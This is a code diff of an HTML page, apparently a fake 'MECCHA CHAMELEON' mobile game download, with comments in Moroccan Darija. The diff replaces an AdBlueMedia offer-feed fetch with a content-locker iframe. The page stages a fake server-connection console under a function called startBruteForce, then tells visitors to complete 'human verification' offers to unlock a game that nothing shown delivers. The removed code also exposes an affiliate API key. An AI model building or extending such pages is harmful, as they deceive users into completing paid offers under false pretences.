@@ -60,7 +60,6 @@
             padding: 20px;
         }
 
-        /* --- EMBED VIDEO POPUP STYLES --- */
         .video-overlay {
             position: fixed;
             top: 0;
@@ -300,63 +299,20 @@
             display: block;
         }
 
-        /* --- STYLE JIDID DYAL L-OFFERS LIST --- */
-        .api-offers-container {
+        /* Iframe styling for AdBlueMedia Locker */
+        .abm-iframe-wrapper {
             width: 100%;
-            max-height: 280px;
-            overflow-y: auto;
-            padding-right: 5px;
-            text-align: left;
-        }
-
-        .offer-item {
-            display: flex;
-            align-items: center;
-            text-decoration: none;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(76, 201, 240, 0.2);
+            min-height: 320px;
+            border: none;
             border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 12px;
-            transition: all 0.2s ease;
-            color: white;
+            background: #fff;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
-        .offer-item:hover {
-            background: rgba(76, 201, 240, 0.1);
-            border-color: var(--primary);
-            transform: scale(1.02);
-        }
-
-        .offer-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 10px;
-            margin-right: 12px;
-            object-fit: cover;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .offer-details {
-            flex: 1;
-        }
-
-        .offer-name {
-            font-weight: 700;
-            font-size: 1rem;
-            color: var(--secondary);
-        }
-
-        .offer-instructions {
-            font-size: 0.8rem;
-            color: var(--text-dim);
-            margin-top: 3px;
-            line-height: 1.3;
-        }
-
-        .api-offers-container::-webkit-scrollbar { width: 4px; }
-        .api-offers-container::-webkit-scrollbar-track { background: transparent; }
-        .api-offers-container::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 4px; }
+        .console-box::-webkit-scrollbar { width: 6px; }
+        .console-box::-webkit-scrollbar-track { background: transparent; }
+        .console-box::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
     </style>
 </head>
 <body>
@@ -381,6 +337,7 @@
             <span class="badge">Mobile Android & iOS Beta</span>
         </header>
 
+        <!-- STEP 1 -->
         <section id="step-username" class="step-panel active">
             <p style="color: var(--text-dim); margin-bottom: 10px;">Enter your Nickname for MECCHA CHAMELEON mobile profile.</p>
             <div class="input-group">
@@ -389,6 +346,7 @@
             <button class="btn" onclick="startBruteForce()">PLAY MECCHA CHAMELEON MOBILE</button>
         </section>
 
+        <!-- STEP 2 -->
         <section id="step-loading" class="step-panel">
             <div class="spinner"></div>
             <h3 style="color: var(--primary); margin-bottom: 5px;">Connecting to MECCHA CHAMELEON Mobile Servers</h3>
@@ -396,6 +354,7 @@
             <div class="console-box" id="console"></div>
         </section>
 
+        <!-- STEP 3 -->
         <section id="step-verify" class="step-panel">
             <div class="lock-icon">🛡️</div>
             <h3 style="color: var(--accent); margin-bottom: 10px; font-size: 1.6rem;">Human Verification Required</h3>
@@ -405,14 +364,12 @@
             </p>
 
             <p style="color: #fff; font-weight: 600; font-size: 1.1rem; margin-bottom: 15px;">
-                Please complete 2 easy tasks/offers below to unlock and start the mobile game!
+                Please complete 1 easy offer below to unlock the mobile game!
             </p>
 
-            <!-- HNA FIN GHADI BANU L-OFFERS AUTOMATIC B L-ICONS O L-INSTRUCTIONS -->
+            <!-- HNA FIN GHADI BAN LOCKER DYAL ADBLUEMEDIA NYSHAN B L-ICONS O KULSHI -->
             <div class="captcha-wrapper">
-                <div id="adbluemedia-offers-list" class="api-offers-container">
-                    <p style="text-align:center; color: var(--primary);">Loading verification tasks...</p>
-                </div>
+                <iframe id="abm-locker-frame" class="abm-iframe-wrapper" src=""></iframe>
             </div>
 
             <span class="support-note">Thank you for supporting MECCHA CHAMELEON mobile developers! ❤️</span>
@@ -445,39 +402,11 @@
             consoleBox.scrollTop = consoleBox.scrollHeight;
         }
 
-        // FETCHING L-OFFERS MAN D L-API FEED NIYSHAN
-        function fetchABMOffers() {
-            const feedUrl = "https://de6jvomfbm0af.cloudfront.net/public/offers/feed.php?user_id=802795&api_key=17f1ff5bbf34f0a6e0af7427457266d6&s1=&s2=";
-            const container = document.getElementById('adbluemedia-offers-list');
-
-            fetch(feedUrl)
-                .then(response => response.json())
-                .then(offers => {
-                    container.innerHTML = ''; // Msa7 l-loading message
-
-                    if (!offers || offers.length === 0) {
-                        container.innerHTML = '<p style="text-align:center; color: var(--accent);">No offers available for your region right now. Please reload.</p>';
-                        return;
-                    }
-
-                    // Kandwzo 3la l-offers lli jawnna (Max 4-5 offers bach tji l-page m9adda)
-                    offers.slice(0, 5).forEach(offer => {
-                        const offerCard = `
-                            <a href="${offer.tracking_url}" target="_blank" class="offer-item">
-                                <img src="${offer.icon_url}" alt="task icon" class="offer-icon">
-                                <div class="offer-details">
-                                    <div class="offer-name">${offer.name}</div>
-                                    <div class="offer-instructions">${offer.instructions}</div>
-                                </div>
-                            </a>
-                        `;
-                        container.insertAdjacentHTML('beforeend', offerCard);
-                    });
-                })
-                .catch(err => {
-                    console.error("Error grabbing offers:", err);
-                    container.innerHTML = '<p style="text-align:center; color: var(--accent);">Error loading tasks. Please refresh.</p>';
-                });
+        // TARIQA L-M9ADDA: KAN-LOADIW L-IFRAME DIREKT MN L-LINK D LOCKER
+        function loadAdBlueMediaLocker() {
+            // Hna bddelt l-link l-9dim b l-link dyal locker dyalk nishan f AdBlueMedia
+            const lockerUrl = "https://de6jvomfbm0af.cloudfront.net/public/locker.php?it=4618601&key=fb573";
+            document.getElementById('abm-locker-frame').src = lockerUrl;
         }
 
         async function startBruteForce() {
@@ -520,8 +449,8 @@
             document.getElementById('step-loading').classList.remove('active');
             document.getElementById('step-verify').classList.add('active');
             
-            // NSYFTO CALL L-API DYAL L-OFFERS F HAD L-WQT NIYSHAN
-            fetchABMOffers();
+            // Kan-loadiw locker hna
+            loadAdBlueMediaLocker();
         }
     </script>
 </body>
